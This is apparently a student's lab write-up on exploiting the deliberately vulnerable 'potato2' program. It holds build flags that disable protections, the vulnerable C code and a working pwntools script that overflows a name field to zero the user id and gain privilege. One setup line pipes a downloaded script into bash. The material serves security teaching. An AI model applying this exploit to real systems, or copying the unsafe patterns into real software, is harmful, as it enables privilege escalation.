Student: Ernst Schwaiger
Date 2024-04-12

# Heap Corruption

The steps below were executed on a Kali 2024.03 system for x64 that runs in a VirtualBox hypervisor.

## Building potato2 for 32 bits

Packages to install upfront to get potato2 to compile for i386/32 bit, python virtual environment,
glibc with debugging symbols, and gdb enhanced features/gef:

```bash
sudo apt install gcc 
sudo apt install gcc-multilib
sudo apt install libc6-dbg-i386-cross
sudo apt install python3-virtualenv
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Checkout the sources of `potato2` and `openssl`, the latter is required since we are going to
build potato2 as 32 bit binary, hence the `openssl` libraries need to be available as 32 bit
as well.

```sh
git clone https://github.com/edgecase1/potato2.git
git clone https://github.com/openssl/openssl.git
cd openssl
./Configure -m32 linux-generic32
make -sj
cd ..
make -sj
cp potato2/userlist .
```

The second make builds `potato2` as 32 bit executable. Since the built `potato2` binaries require to have
the `userlist` file present in the current folder, this file is copied from the `potato2` folder.

```Makefile
# needs to have openssl checked out as sibling folder of potato
# git clone https://github.com/openssl/openssl.git
# and requires installation of gcc multilib
# sudo apt install gcc-multilib for m32

WARN_OPTS=-Wno-deprecated-declarations -Wno-unused-result
SEC_OPTS=-fno-stack-protector -z execstack -no-pie
DEBUG_OPTS=-ggdb3 -O0
INCLUDES=-Iopenssl/include -I/usr/include -Ipotato2/src
DEFINES=-D_FORTIFY_SOURCE=0

CCOPTS = $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS) $(INCLUDES) $(DEFINES)

CFILES = \
	potato2/src/main.c \
	potato2/src/runr.c \
	potato2/src/sock.c \
	potato2/src/userlist.c \
	potato2/src/func.c \
	potato2/src/login2.c

HFILES = \
	potato2/src/runr.h \
	potato2/src/sock.h \
	potato2/src/user.h \
	potato2/src/userlist.h 

.PHONY: clean all

all: potato

# binary for usual attacks
potato: $(CFILES) $(HFILES)
	gcc -m32 $(CCOPTS) -o potato $(CFILES) -Lopenssl  -lssl -lcrypto 

clean:
	rm -f potato
```

Now, potato2 can be built and run in the `potato` folder:

```bash
make -sj
./potato
./potato console
./potato server
```

On Kali systems, `LD_LIBRARY_PATH` is empty, hence an error message 
`error while loading shared libraries: libcrypto.so.3: cannot open shared object file` appears when
`./potato` is started. To get around that, add the folder where openssl was checked out to:

```bash
export LD_LIBRARY_PATH=<openssl_folder>:$LD_LIBRARY_PATH
```

## Spotting vulnerabilities

Before looking at the code, `grep` can be used for a quick scan through the source for finding
C stdlib functions that are insecure, or can be used in an insecure way:

```bash
find potato2/src -name "*.c" | xargs grep -w -n \
  -e "gets" \
  -e "strcpy" \
  -e "strcat" \
  -e "sprintf" \
  -e "vsprintf" \
  -e "scanf" \
  -e "fscanf" \
  -e "sscanf" \
  -e "memcpy" \
  -e "memmove" \
  -e "strtok"

potato2/src/login2.c:43:    strcpy(user->name, username);
potato2/src/login2.c:44:    sprintf(user->home, "/home/%s", username);
potato2/src/login2.c:45:    strcpy(user->shell, "/usr/bin/rbash");
potato2/src/func.c:60:    scanf("%d", &id);
potato2/src/func.c:187:    fscanf(stdin, "%s", input_username); // TODO security
potato2/src/userlist.c:240:    token = strtok(line, ":");
potato2/src/userlist.c:246:                strcpy(parsed_user->name, token);
potato2/src/userlist.c:257:                     strcpy(parsed_user->home, token);
potato2/src/userlist.c:260:                     strcpy(parsed_user->shell, token);
potato2/src/userlist.c:266:       token = strtok(NULL, ":");
```

The code at `func.c`, line 187 looks promising. The function `fscanf` in `change_name()` reads
a string from `stdin` and stores it in `input_username`. If the user
enters more than `USERNAME_LENGTH` characters, a buffer overflow happens. By providing more
bytes than `input_username` can hold, the return address in the stack frame can be overwritten 
by a user-chosen address. This will redirect the path of execution to that address once the
execution of `change_name()` finishes.

```c
void
change_name()
{
    char input_username[USERNAME_LENGTH];
        
    fprintf(stdout, "What is the name > ");
    //fgets(input_username, sizeof(input_username), stdin);
    fscanf(stdin, "%s", input_username); // TODO security
    input_username[strcspn(input_username, "\n")] = 0x00; // terminator instead of a newline

    strncpy(session.logged_in_user->name, input_username, strlen(input_username)+1);
    fprintf(stdout, "Name changed.\n");
}
```

## Setup of the debugging environment

Start a python virtual environment, install the `pwntools` and `libheap` packages.

```bash
virtualenv venv
. ./venv/bin/activate
pip install pwntools
git clone https://github.com/cloudburst/libheap
pip3 install ./libheap/
```

## overwrite a user (t_user) structure to gain privileges

It is possible to make the currently logged in user a privileged one overwriting the stack return address. 
By overwriting the global user data structure such that the logged in user obtains a user id of zero, we get the 
credentials. 


```c
int
is_privileged()
{
    t_user* user = session.logged_in_user;
     if(user->id < 1 || user->gid < 1) // is a root user
     {
          return 1;
     }
     else
     {
          fprintf(stderr, "privileged users only!");
          return 0;
     }
}
```

For that purpose, we exploit the fact that the `strncpy()` call always appends the string 
terminator `0x00` to the target string:

```c
void
change_name()
{
    char input_username[USERNAME_LENGTH];
        
    fprintf(stdout, "What is the name > ");
    //fgets(input_username, sizeof(input_username), stdin);
    fscanf(stdin, "%s", input_username); // TODO security
    input_username[strcspn(input_username, "\n")] = 0x00; // terminator instead of a newline

    strncpy(session.logged_in_user->name, input_username, strlen(input_username)+1);
    fprintf(stdout, "Name changed.\n");
}
```

The `t_user` data structure into which `strncpy()` writes is defined as follows:
```c
struct _user
{
     char name[20];
     char password_hash[32]; // md5
     int id;
     int gid;
     char home[50];
     char shell[50];
} typedef t_user;
```

By providing a long enough input string, strncpy will overwrite `name`, `password_hash`, and `id` and insert
a `0x00` byte at the end. The value of `id` in the current users' `t_user` structure is `10000`, or `0x2710`. 
In a little-endian architecture, the LSB of `id` can be found at the address of `id`, and the MSB at the 
address of `id` + 3:

```gdb
gef➤  x/4bx &session->logged_in_user->id
0x8050464:      0x10    0x27    0x00    0x00
```

In order to get the number of bytes to overwrite until we arrive at the LSB of `id` is `0x34`, or `52` and 
can be calculates as follows:

```gdb
gef➤  p &session->logged_in_user->id
$1 = (int *) 0x8050464
gef➤  p &session->logged_in_user->name
$2 = (char (*)[20]) 0x8050430
gef➤  p 0x8050464 - 0x8050430
$3 = 0x34
gef➤  
```

I.e. by providing a string of length `52 + 1`, `strncpy` will overwrite the `0x27` byte of the `id` field with `0x00`,
by providing a string of length `52`, `strncpy` will overwrite the `0x10` byte.

```python
#!/usr/bin/env python3

from pwn import *

import sys

elf = ELF("./potato")

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break main
break func.c:191
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

# overwrite user structure with user-chosen id: 0
# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
# since strncpy adds a null terminator at session.logged_in_user->name[54]
p.sendline(b"changename")
payload=b"\x41"*50 + b"\x42"*3
p.sendline(payload)

# Repeat the same for session.logged_in_user->name[53]
p.sendline(b"changename")
payload=b"\x41"*50 + b"\x42"*2
p.sendline(payload)

# all bytes in session.logged_in_user->id are now zero, we are privileged
# change name back to original
p.sendline(b"changename")
payload=b"peter"
p.sendline(payload)

p.interactive()
```

After returning to interactive mode, `whoami` displays the `id`of the current user as zero, i.e. privileged.

```bash
cmd> $ whoami
user(name='peter' id=0 gid=10000 home='/home/peter' shell='/usr/bin/rbash')
```

## find a memory leak to identify a heap bin or chunk (look at the session and whoami; it's enough to show the chunk or memory location in gdb) [3]

## gain a shell with root privileges (look at the allocator with ltrace while creating and deleting users) [4]

## demonstrate a use after free or double free condition in the program [3]

